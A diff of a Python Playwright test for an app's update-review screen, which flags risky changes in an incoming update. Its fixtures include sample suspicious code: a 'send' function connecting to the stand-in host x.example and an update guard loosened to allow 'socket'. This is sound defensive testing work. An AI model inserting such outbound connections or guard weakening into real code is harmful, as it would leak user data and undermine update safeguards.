+        def find(kind, file, level, topic, title, arg="", where="", lines=(), new=True, **more):
+            return dict({"kind": kind, "file": file, "what": where or arg, "new": new, "level": level, "topic": topic, "title": title,
+                         "why": title.replace("upd_t_", "upd_w_"), "arg": arg, "where": where, "lines": list(lines)}, **more)
+        finds = [find("guard", "update_guard.py", "critical", "check", "upd_t_check", lines=["-HARMLESS = ('json',)", "+HARMLESS = ('json', 'socket')"], new=False),
+                 find("call", "work.py", "critical", "new_host:x.example", "upd_t_new_host", "x.example", "send", ["+def send(d):", "+    socket.create_connection(('x.example', 443))"]),
+                 find("call", "tools.py", "review", "way_program:open", "upd_t_way_program", "open", "show", ["-subprocess.run(['open', '-R', path])", "+subprocess.run(['open', path])"], new=False),
+                 find("around", "tools.py", "review", "way_program:open", "upd_t_way_program", "open", "HELPER", ["+HELPER = 1"], more=40),
+                 find("address", "web/app.js", "critical", "address:x.example", "upd_t_address", "x.example/<b>a</b>", lines=["+const more = 'https://x.example/<b>a</b>';"]),
+                 {"kind": "extra", "file": "Tool.app/x", "what": "Tool.app/x (made by a program)", "new": True},              # one Kontor did not judge
+                 find("rule", "web_search.py", "plain", "filter", "upd_t_filter", where="GENERIC", new=False),
+                 find("rule", "web_search.py", "plain", "filter", "upd_t_filter", where="_LEET", new=False)]
         self.app.update_info = self.info(finds)
         asked = []
         keep = updates.install
@@ -1070,7 +1435,7 @@ class Settings(unittest.TestCase):
 
         def install(repo, zip_url=None, restart=True, approved=""):
             asked.append(approved)                              # read again: now it holds something else -- nothing installed
-            return {"ok": False, "needs_approval": True, "version": "9.9.9", "text": "wartet", "review": {"digest": "e" * 64, "findings": finds[:1]}}
+            return {"ok": False, "needs_approval": True, "version": "9.9.9", "text": "wartet", "review": {"digest": "e" * 64, "findings": finds[1:2]}}
         updates.install = install
         try:
             with self.sync_playwright() as p:
@@ -1086,8 +1451,24 @@ class Settings(unittest.TestCase):
                     pg.click("#login-btn"); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                     pg.evaluate("location.hash = '#settings/updates'"); pg.wait_for_selector("#up-review", timeout=15000)
                     self.assertEqual(pg.evaluate("document.querySelector('#nav a[href=\"#settings\"] .nbadge').textContent"), "!")
-                    self.assertEqual(pg.evaluate("document.querySelectorAll('#up-review details').length"), 3)          # one line per kind
-                    self.assertEqual(pg.evaluate("document.querySelector('#up-review').querySelectorAll('b b, code b').length"), 0)     # shown as text
+                    # one entry per topic (a finding not judged: by its kind), critical first; the plain ones in one quiet line
+                    titles = pg.evaluate("[...document.querySelectorAll('#up-review details.up-find > summary')].map(s => s.textContent)")
+                    self.assertEqual(len(titles), 5, titles)
+                    self.assertEqual(titles[0], "Die Update-Prüfung selbst wurde geändert")
+                    self.assertIn("Neue Verbindung ins Internet: x.example", titles)
+                    self.assertIn("Aufruf eines Programms geändert: open", titles)
+                    self.assertIn("Kommt im Programmordner an, ohne Teil des Programms zu sein: Tool.app/x (made by a program)", titles)
+                    self.assertEqual(pg.evaluate("document.querySelectorAll('#up-review details.up-find.crit').length"), 4)
+                    self.assertIn("4 Funde können ein Risiko sein, bei 1 Fund ändert sich", pg.inner_text("#up-review .note"))
+                    self.assertEqual(pg.evaluate("document.querySelector('#up-plain summary').textContent"), "2 Änderungen an Regeln – nur strenger")
+                    # opened: the explanation, where, and the lines folded; every text of the update's files shown as text
+                    pg.click("#up-review details.up-find:nth-child(3) > summary")
+                    body = pg.inner_text("#up-review details.up-find:nth-child(3) .up-body")
+                    self.assertIn("Kontor startet dieses Programm schon heute", body); self.assertIn("tools.py · show", body); self.assertIn("tools.py · HELPER", body)
+                    self.assertFalse(pg.is_visible("#up-review details.up-find:nth-child(3) pre.up-diff"))
+                    pg.click("#up-review details.up-find:nth-child(3) .up-part:nth-child(3) details.up-lines > summary")
+                    self.assertIn("… und 40 weitere Zeilen", pg.inner_text("#up-review details.up-find:nth-child(3) .up-part:nth-child(3) pre.up-diff"))
+                    self.assertEqual(pg.evaluate("document.querySelector('#up-review').querySelectorAll('b b, code b, pre b').length"), 0)
                     self.assertIn("<b>a</b>", pg.evaluate("document.querySelector('#up-review').textContent"))
                     self.assertEqual(pg.inner_text("#up-install").strip(), "Freigeben und installieren")
                     self.assertLessEqual(pg.evaluate("document.documentElement.scrollWidth"), pg.evaluate("document.documentElement.clientWidth") + 1)
@@ -1096,18 +1477,23 @@ class Settings(unittest.TestCase):
                     self.assertEqual(asked, [])
                     # confirmed: approved for the files shown; Kontor reads again, finds something else and shows that instead
                     pg.once("dialog", lambda d: d.accept()); pg.click("#up-install")
-                    until(pg, "document.querySelectorAll('#up-review details').length === 1")
+                    until(pg, "document.querySelectorAll('#up-review details.up-find').length === 1")
                     self.assertEqual(asked, ["d" * 64]); asked.clear()
                     self.assertEqual(self.app.update_info["review"]["digest"], "e" * 64)
-                    # an update without findings: as ever -- a dot in the menu, the plain button, no word about findings
-                    self.app.update_info = self.info([])
+                    # only what is plain: as ever -- a dot in the menu, the plain button, the quiet line, no question
+                    self.app.update_info = self.info(finds[-2:])
                     pg.reload(); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                     pg.wait_for_selector("#up-install", timeout=15000)
-                    self.assertIsNone(pg.query_selector("#up-review"))
+                    self.assertIsNone(pg.query_selector("#up-review")); self.assertIsNotNone(pg.query_selector("#up-plain"))
                     self.assertEqual(pg.evaluate("document.querySelector('#nav a[href=\"#settings\"] .nbadge').className"), "nbadge")       # the plain dot
                     self.assertEqual(pg.inner_text("#up-install").strip(), "Update installieren und Dienst neu starten")
                     pg.click("#up-install"); until(pg, "document.querySelector('#up-review') !== null")     # (the stand-in answers "waits")
                     self.assertEqual(asked, [""]); asked.clear()
+                    # an update without findings: no word about them
+                    self.app.update_info = self.info([])
+                    pg.reload(); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
+                    pg.wait_for_selector("#up-install", timeout=15000)
+                    self.assertIsNone(pg.query_selector("#up-review")); self.assertIsNone(pg.query_selector("#up-plain"))
                     self.assertEqual(errors, [])
                     pg.context.close()
                 b.close()
